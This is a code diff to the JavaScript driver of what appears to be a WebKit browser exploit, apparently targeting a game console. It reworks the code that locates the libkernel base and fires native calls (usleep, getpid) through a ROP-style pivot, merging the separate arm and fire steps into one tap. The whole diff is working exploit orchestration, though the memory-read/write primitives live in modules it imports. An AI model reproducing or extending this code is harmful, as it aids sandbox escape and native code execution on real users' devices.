@@ -55,12 +55,14 @@ import {
     huntLibkernelCandidatesChunk,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
-import { prepNativeChain, stageGetpid, stageUsleep, fireGetpid } from "./native_call.js";
+import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250832i";
+const BUILD_ID = "rw-20250832j";
 /** Native fire mode: usleep first (Suchi wrapper), getpid after lk confirmed */
 const NATIVE_FIRE_USLEEP = params.get("native") !== "getpid";
+/** ?native=1tap — layout+fire atomically (no separate Arm tap) */
+const NATIVE_ONE_TAP = params.has("native") && params.get("native") === "1tap";
 /** BillZaiD fixed lk base (game process) — trial in WebKit via usleep prologue */
 const BILLZAI_LK_BASE = "80a67c000";
 const SS_HUNT_TRACE = "wk-hunt-trace";
@@ -229,10 +231,10 @@ function setUi() {
         btnNative.disabled = busy || !ready || !nativeAllowed;
         if (nativeStaged) {
             btnNative.textContent = NATIVE_FIRE_USLEEP ? "Fire usleep" : "Fire getpid";
-            btnNative.title = "expm1 pivot — zero alloc, one tap";
+            btnNative.title = "atomic layout+expm1 (one tap)";
         } else {
-            btnNative.textContent = NATIVE_FIRE_USLEEP ? "Arm usleep" : "Arm getpid";
-            btnNative.title = "Accept lk first — Arm then Fire";
+            btnNative.textContent = NATIVE_FIRE_USLEEP ? "Fire usleep" : "Arm getpid";
+            btnNative.title = "Accept lk first — single tap fires usleep";
         }
     }
     if (btnLoadCal) btnLoadCal.disabled = busy || !ready;
@@ -3130,66 +3132,44 @@ function runForceLkOnly(lk) {
 }
 
 function runArmGetpid() {
+    runFireGetpid();
+}
+
+function runFireGetpid() {
     if (busy || !ready || !window.p || !nativeAllowed) return;
     const p = window.p;
     const off = loadEffectiveOff();
     const lk = lkFromUi();
     if (!lk) {
-        mark("NATIVE-SKIP", "Force lk first — Load cal ptr → hex → Force lk");
-        state("Force lk first", "bad");
-        return;
-    }
-    busy = true;
-    setUi();
-    nativeQuiet = true;
-    try {
-        if (!nativePrep) ensureNativePrep(p, off);
-        if (NATIVE_FIRE_USLEEP) {
-            stageUsleep(p, nativePrep, lk, off, 1000);
-            mark("NATIVE-ARMED", "usleep+13b20 — tap Fire (Suchi wrapper, not stub table)");
-        } else {
-            stageGetpid(p, nativePrep, lk, off);
-            const { stub, stubOff } = getpidStubAddr(lk, off);
-            mark("NATIVE-ARMED", "getpid+" + stubOff.toString(16) + " stub=" + stub);
-        }
-        nativeStaged = true;
-        state("armed — Fire", "warn");
-        crashLog.append("NATIVE-ARMED lk=" + lk, "NATIVE-ARM");
-        crashLog.flushSync();
-    } catch (err) {
-        mark("NATIVE-FAIL", "arm: " + (err.message || String(err)));
-        state("arm failed", "bad");
-    } finally {
-        nativeQuiet = false;
-        busy = false;
-        setUi();
+        mark("NATIVE-SKIP", "Accept lk first");
         renderOut();
-    }
-}
-
-function runFireGetpid() {
-    if (busy || !ready || !window.p || !nativeAllowed) return;
-    if (!nativePrep || !nativeStaged) {
-        runArmGetpid();
         return;
     }
+    if (!nativePrep) {
+        try {
+            ensureNativePrep(p, off);
+        } catch (err) {
+            mark("NATIVE-FAIL", "prep: " + (err.message || String(err)));
+            renderOut();
+            return;
+        }
+    }
+
     busy = true;
-    setUi();
     nativeQuiet = true;
     lkQuiet = true;
     pinNativeRetain();
-    if (outEl) outEl.textContent = "Fire native…";
 
-    let pid = -1;
     let errMsg = null;
-    const p = window.p;
-    const lk = lkFromUi();
-    const off = loadEffectiveOff();
-    const kind = (nativePrep && nativePrep.fireKind) || (NATIVE_FIRE_USLEEP ? "usleep" : "getpid");
+    let pid = -1;
+    const kind = NATIVE_FIRE_USLEEP ? "usleep+13b20" : "getpid";
     try {
-        crashLog.append("NATIVE-FIRE " + kind + " lk=" + lk, "NATIVE-FIRE");
-        crashLog.flushSync();
-        pid = fireGetpid(p, nativePrep);
+        if (NATIVE_FIRE_USLEEP)
+            pid = fireUsleep(p, nativePrep, lk, off, 1000);
+        else {
+            stageGetpid(p, nativePrep, lk, off);
+            pid = fireNativeCall(p, nativePrep);
+        }
     } catch (err) {
         errMsg = err.message || String(err);
     }
@@ -3197,40 +3177,30 @@ function runFireGetpid() {
     nativeQuiet = false;
     lkQuiet = false;
     nativeStaged = false;
-    if (kind.startsWith("usleep")) {
-        if (!errMsg) {
-            mark("NATIVE-OK", kind + " returned (no OOM) build=" + BUILD_ID);
-            state("usleep OK — add ?native=getpid for getpid", "ok");
-            try {
-                if (lk) saveLibkernelSession(lk, null, { forced: true });
-                crashLog.append("NATIVE-OK " + kind, "NATIVE-OK");
-                crashLog.flushSync();
-            } catch (_) { }
-        } else {
-            mark("NATIVE-FAIL", kind + " " + errMsg + " build=" + BUILD_ID);
-            state("native fire failed", "bad");
-        }
-    } else if (pid > 0) {
+    busy = false;
+
+    if (kind.startsWith("usleep") && !errMsg) {
+        mark("NATIVE-OK", kind + " lk=" + lk + " (atomic) build=" + BUILD_ID);
+        state("usleep OK — native call works", "ok");
+        try {
+            saveLibkernelSession(lk, null, { forced: true });
+            crashLog.append("NATIVE-OK " + kind, "NATIVE-OK");
+        } catch (_) { }
+    } else if (!kind.startsWith("usleep") && pid > 0) {
         mark("NATIVE-OK", "getpid=" + pid + " build=" + BUILD_ID);
         state("getpid OK pid=" + pid, "ok");
-        try {
-            if (lk) saveLibkernelSession(lk, null, { forced: true });
-            crashLog.append("NATIVE-OK getpid=" + pid, "NATIVE-OK");
-            crashLog.flushSync();
-        } catch (_) { }
     } else {
-        mark("NATIVE-FAIL", (errMsg || "getpid=" + pid) + " build=" + BUILD_ID);
-        state("getpid failed", "bad");
+        mark("NATIVE-FAIL", (errMsg || "fire failed") + " build=" + BUILD_ID);
+        state("native fire failed", "bad");
     }
-    if (outEl) outEl.textContent = lines.join("\n");
     pivotReady = true;
-    busy = false;
     setUi();
+    renderOut();
+    try { crashLog.flushSync(); } catch (_) { }
 }
 
 async function doNativeCallImmediate() {
-    if (nativeStaged) runFireGetpid();
-    else runArmGetpid();
+    runFireGetpid();
 }
 
 async function freeBeforeNative() {
@@ -3271,9 +3241,7 @@ async function runRwProofManual() {
 }
 
 async function runNativeCall() {
-    if (busy || !ready || !window.p) return;
-    if (nativeStaged) runFireGetpid();
-    else runArmGetpid();
+    runFireGetpid();
 }
 
 async function loadExploit() {
